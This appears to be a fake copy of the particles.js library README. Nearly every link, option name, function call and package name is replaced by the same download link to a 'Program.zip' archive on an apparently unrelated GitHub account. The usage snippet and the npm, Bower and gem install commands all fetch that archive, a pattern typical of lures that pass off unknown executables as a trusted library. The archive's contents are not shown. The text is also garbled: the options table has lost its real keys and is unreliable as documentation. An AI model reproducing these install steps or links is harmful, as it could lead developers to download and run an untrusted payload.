## https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip

### A lightweight JavaScript library for creating particles.

------------------------------
### `Demo / Generator`

<a href="https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip" target="_blank"><img src="https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip" alt="https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip generator" /></a>

Configure, export, and share your https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip configuration on CodePen: <br />
https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip

CodePen demo: <br />
https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip

-------------------------------
### `Usage`

Load https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip and configure the particles:

**https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip**
```html
<div id="particles-js"></div>

<script src="https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip"></script>
```

**https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip**
```javascript
/* https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip(@dom-id, @path-json, @callback (optional)); */
https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip('particles-js', 'https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip', function() {
  https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip('callback - https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip config loaded');
});
```

**https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip**
```javascript
{
  "particles": {
    "number": {
      "value": 80,
      "density": {
        "enable": true,
        "value_area": 800
      }
    },
    "color": {
      "value": "#ffffff"
    },
    "shape": {
      "type": "circle",
      "stroke": {
        "width": 0,
        "color": "#000000"
      },
      "polygon": {
        "nb_sides": 5
      },
      "image": {
        "src": "https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip",
        "width": 100,
        "height": 100
      }
    },
    "opacity": {
      "value": 0.5,
      "random": false,
      "anim": {
        "enable": false,
        "speed": 1,
        "opacity_min": 0.1,
        "sync": false
      }
    },
    "size": {
      "value": 10,
      "random": true,
      "anim": {
        "enable": false,
        "speed": 80,
        "size_min": 0.1,
        "sync": false
      }
    },
    "line_linked": {
      "enable": true,
      "distance": 300,
      "color": "#ffffff",
      "opacity": 0.4,
      "width": 2
    },
    "move": {
      "enable": true,
      "speed": 12,
      "direction": "none",
      "random": false,
      "straight": false,
      "out_mode": "out",
      "bounce": false,
      "attract": {
        "enable": false,
        "rotateX": 600,
        "rotateY": 1200
      }
    }
  },
  "interactivity": {
    "detect_on": "canvas",
    "events": {
      "onhover": {
        "enable": false,
        "mode": "repulse"
      },
      "onclick": {
        "enable": true,
        "mode": "push"
      },
      "resize": true
    },
    "modes": {
      "grab": {
        "distance": 800,
        "line_linked": {
          "opacity": 1
        }
      },
      "bubble": {
        "distance": 800,
        "size": 80,
        "duration": 2,
        "opacity": 0.8,
        "speed": 3
      },
      "repulse": {
        "distance": 400,
        "duration": 0.4
      },
      "push": {
        "particles_nb": 4
      },
      "remove": {
        "particles_nb": 2
      }
    }
  },
  "retina_detect": true
}
```

-------------------------------

### `Options`

key | option type / notes | example
----|---------|------
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | number | `40`
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | boolean | `true` / `false` 
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | number | `800`
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | HEX (string) <br /> RGB (object) <br /> HSL (object) <br /> array selection (HEX) <br /> random (string) | `"#b61924"` <br /> `{r:182, g:25, b:36}` <br />  `{h:356, s:76, l:41}` <br /> `["#b61924", "#333333", "999999"]` <br /> `"random"`
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | string <br /> array selection | `"circle"` <br /> `"edge"` <br /> `"triangle"` <br /> `"polygon"` <br /> `"star"` <br /> `"image"` <br /> `["circle", "triangle", "image"]`
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | number | `2`
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | HEX (string) | `"#222222"`
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | number | `5`
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | path link <br /> svg / png / gif / jpg | `"https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip"` <br /> `"https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip"`
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | number <br />(for aspect ratio) | `100`
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | number <br />(for aspect ratio) | `100`
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | number (0 to 1) | `0.75`
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | boolean | `true` / `false` 
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | boolean | `true` / `false` 
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | number | `3`
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | number (0 to 1) | `0.25`
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | boolean | `true` / `false`
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | number | `20`
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | boolean | `true` / `false` 
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | boolean | `true` / `false` 
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | number | `3`
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | number | `0.25`
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | boolean | `true` / `false`
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | boolean | `true` / `false`
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | number | `150`
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | HEX (string) | `#ffffff`
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | number (0 to 1) | `0.5`
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | number | `1.5`
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | boolean | `true` / `false`
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | number | `4`
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | string | `"none"` <br /> `"top"` <br /> `"top-right"` <br /> `"right"` <br /> `"bottom-right"` <br /> `"bottom"` <br /> `"bottom-left"` <br /> `"left"` <br /> `"top-left"`
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | boolean | `true` / `false`
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | boolean | `true` / `false`
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | string <br /> (out of canvas) | `"out"` <br /> `"bounce"`
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | boolean <br /> (between particles) | `true` / `false`
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | boolean | `true` / `false`
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | number | `3000`
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | number | `1500`
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | string | `"canvas", "window"`
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | boolean | `true` / `false`
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | string <br /> array selection | `"grab"` <br /> `"bubble"` <br /> `"repulse"` <br /> `["grab", "bubble"]`
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | boolean | `true` / `false`
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | string <br /> array selection | `"push"` <br /> `"remove"` <br /> `"bubble"` <br /> `"repulse"` <br /> `["push", "repulse"]`
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | boolean | `true` / `false`
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | number | `100`
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | number (0 to 1) | `0.75`
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | number | `100`
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | number | `40`
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | number <br /> (second) | `0.4`
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | number | `200`
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | number <br /> (second) | `1.2`
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | number | `4`
`https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip` | number | `4`
`retina_detect` | boolean | `true` / `false`

-------------------------------

### `Packages install`

##### ***npm***
https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip
```
npm install https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip
```

##### ***Bower***
```
bower install https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip --save
```

##### ***Rails Assets***
```
gem 'https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip'
```

##### ***Meteor***
https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip
```
meteor add newswim:particles
```

-------------------------------

### `Hosting / CDN`

***Please use this host or your own to load https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip on your projects***

https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip!https://github.com/andrewKLF/particles.js/releases/download/v1.0/Program.zip
